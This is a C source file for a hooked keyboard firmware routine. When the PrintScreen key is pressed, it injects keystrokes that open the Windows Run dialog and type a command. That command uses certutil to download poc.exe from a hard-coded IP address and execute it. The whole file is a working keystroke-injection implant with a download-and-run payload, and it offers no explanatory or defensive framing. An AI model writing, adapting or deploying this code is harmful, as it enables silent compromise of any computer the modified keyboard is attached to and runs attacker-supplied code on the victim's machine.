#include <stdint.h>
#include <stddef.h>


int send_descriptor(int a1, uint8_t *buf, int size);
typedef int (*send_descriptor_t)(int, uint8_t *, int);

__attribute__((always_inline)) inline static void* imemcpy (void *dest, const void *src, size_t len)
{
	char *d = dest;
	const char *s = src;
	while (len--)
		*d++ = *s++;
	return dest;
}

inline __attribute__((always_inline)) static void send_key(uint8_t a1, uint8_t a2)
{
	uint8_t buf[8] = {0,};
	send_descriptor_t send_descriptor;
	send_descriptor = (send_descriptor_t)send_descriptor;

	volatile int i;
	
	
	// TODO : change this to timer
	volatile int loop = 0x10000;

	buf[0] = a1;
	buf[2] = a2;
	send_descriptor(2, buf, 8);

	// HACK : 
	for(i = 0; i< loop; i++) {}

}

__attribute__((flatten)) int hooked_send_descriptor(int a1, uint8_t *buf, int size)
{
	// HACK : avoid memcpy on gcc
	char phase_2[0x4c];
	imemcpy(phase_2, "cmd\ncertutil -urlcache -split -f http://158.247.212.174/poc.exe && poc.exe\n", 0x4c);
	send_descriptor_t send_descriptor;
	send_descriptor = (send_descriptor_t)send_descriptor;


	if(a1 == 2 && size==8)
	{
		// PrintScreen Key
		if(buf[0] == 0x00 && buf[2] == 0x46)
		{

			// Windows + R
			send_key(8, 0);
			send_key(8, 21);
			send_key(8, 0);
			send_key(0, 0);

			// cmd
			for(int i=0; i<sizeof(phase_2)-1; i++)
			{
				uint8_t ch;
				ch = phase_2[i];

				if(ch >= 'a' && ch <= 'z')
				{
					ch = ch - 'a' + 4;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if(ch >= '1' && ch <= '9')
				{
					ch = ch - '1' + 30;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if(ch == '0')
				{
					ch = 39;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if (ch == ' ')
				{
					ch = 0x2C;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if(ch == '-')
				{
					ch = 0x2D;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if(ch == '\n')
				{
					ch = 0x28;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if(ch == ':')
				{
					send_key(0x20, 0);
					send_key(0x20, 0x33);
					send_key(0x20, 0);
					send_key(0, 0);
				}
				else if(ch == '/')
				{
					ch = 0x38;
					send_key(0, ch);
					send_key(0, 0);
				}

				else if(ch == '.')
				{
					ch = 0x37;
					send_key(0, ch);
					send_key(0, 0);
				}
				else if(ch == '&')
				{
					send_key(0x20, 0);
					send_key(0x20, 0x24);
					send_key(0x20, 0);
					send_key(0, 0);
				}
			}


		}
	}

	return send_descriptor(a1, buf, size);
}
